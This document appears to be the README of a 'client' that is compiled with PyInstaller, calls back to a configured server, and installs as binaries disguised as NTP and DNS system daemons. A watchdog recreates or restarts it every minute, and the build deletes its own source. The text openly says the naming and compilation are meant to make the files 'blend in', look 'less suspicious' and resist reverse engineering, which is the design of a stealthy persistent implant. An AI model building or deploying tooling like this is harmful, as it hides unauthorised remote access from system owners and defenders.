# Client Installation Files

## Overview

The client uses a template-based installation system where configuration is embedded directly into Python scripts, which are then compiled to standalone binary executables using PyInstaller.

## File Descriptions

### Source Files (in repository)

1. **ntp-daemon** 
   - Python script template for the client
   - Contains placeholders: `{{SERVER_HOST}}`, `{{SERVER_PORT}}`, `{{CLIENT_NAME}}`
   - Used by `install.sh` to create the final configured script

2. **conf** (bash version - kept for reference)
   - Original bash monitor/watchdog script
   
3. **conf.py** (Python version - used for installation)
   - Monitor/watchdog script in Python
   - Checks service health every minute
   - Recreates missing service files
   - Restarts stopped services
   - Compiled to binary during installation

4. **client.py**
   - Original client script (uses .env file)
   - For standalone testing and development
   - Not used during installation

5. **env.example**
   - Configuration template
   - Copy to `.env` and edit before installation

6. **install.sh**
   - Reads `.env` file
   - Replaces placeholders in `ntp-daemon` with actual values
   - Installs configured script to `/etc/ntpsync/ntp`
   - Sets up systemd services

7. **uninstall.sh**
   - Removes all installed files and services
   - Cleans up systemd configuration

### Installed Files (on target system)

1. **/etc/ntpsync/ntp**
   - **Compiled binary executable** (ELF format)
   - Created from ntp-daemon template with embedded configuration
   - No Python source code visible
   - Configuration embedded during compilation

2. **/etc/dnsresolve/conf**
   - **Compiled binary executable** (ELF format)
   - Created from conf.py
   - No Python source code visible

3. **/etc/systemd/system/ntpsyncd.service**
   - Main service file
   - Runs `/etc/ntpsync/ntp`

4. **/etc/systemd/system/dnsresolv.service**
   - Monitor service file
   - Runs `/etc/dnsresolve/conf`

5. **/etc/systemd/system/dnsresolv.timer**
   - Timer that triggers monitor every minute

## Installation Flow

```
1. User creates .env file with configuration
   ↓
2. install.sh reads .env
   ↓
3. install.sh replaces {{placeholders}} in ntp-daemon
   ↓
4. PyInstaller compiles ntp-daemon to binary executable
   ↓
5. Compiled binary saved to /etc/ntpsync/ntp
   ↓
6. PyInstaller compiles conf.py to binary executable
   ↓
7. Compiled binary saved to /etc/dnsresolve/conf
   ↓
8. Systemd services installed and enabled
   ↓
9. Services started
   ↓
10. Build directory with Python source files deleted
```

## Why This Approach?

1. **No .env dependency**: The installed binary has configuration embedded, so no separate .env file is needed on the target system
2. **Clean installation**: All configuration in one place (embedded in `/etc/ntpsync/ntp`)
3. **Security**: No separate readable config file to worry about
4. **Obfuscation**: Source code is compiled to binary, making reverse engineering much harder
5. **Standalone**: Binaries include all dependencies, no Python interpreter needed on target
6. **Simplicity**: Monitor script doesn't need to check for .env file existence

## Updating Configuration

Since configuration is embedded in compiled binary, updates require recompilation:

```bash
# 1. Edit .env in client directory
nano .env

# 2. Recompile and reinstall (will update the embedded configuration)
sudo ./install.sh
```

The installation script will:
1. Read new configuration from .env
2. Create new configured Python script with embedded values
3. Recompile to binary
4. Replace existing binary
5. Restart service

## File Naming Rationale

- **ntp-daemon** → Compiles to `/etc/ntpsync/ntp` (looks like NTP system daemon binary)
- **conf.py** → Compiles to `/etc/dnsresolve/conf` (looks like DNS resolver config/binary)
- This naming helps the files blend in as what appear to be legitimate system service binaries:
  - `/etc/ntpsync/` - NTP synchronization daemon directory
  - `/etc/dnsresolve/` - DNS resolver configuration directory
- Binary files are less suspicious than Python scripts in system directories
- No .py extension on installed files - appear as system binaries

